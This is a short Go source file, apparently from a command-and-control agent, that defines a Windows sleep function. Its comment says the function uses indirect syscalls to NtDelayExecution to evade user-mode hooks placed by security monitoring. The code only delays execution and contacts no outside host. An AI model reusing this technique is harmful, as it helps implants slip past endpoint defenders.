//go:build windows

package commands

import (
	"time"
	"unsafe"
)

// AgentSleep sleeps for the specified duration.
// It leverages NtDelayExecution via indirect syscalls on Windows to evade
// user-mode hooks on kernel32!Sleep or ntdll!NtDelayExecution.
func AgentSleep(d time.Duration) {
	if IndirectSyscallsAvailable() {
		// Calculate delay interval in 100-nanosecond units.
		// Negative values indicate a relative time interval.
		delayInterval := int64(-d.Nanoseconds() / 100)

		status := IndirectNtDelayExecution(0, &delayInterval)
		// If the indirect syscall failed for any reason, fallback to time.Sleep
		if status == 0xC0000001 { // STATUS_UNSUCCESSFUL fallback
			time.Sleep(d)
		}
	} else {
		time.Sleep(d)
	}
}
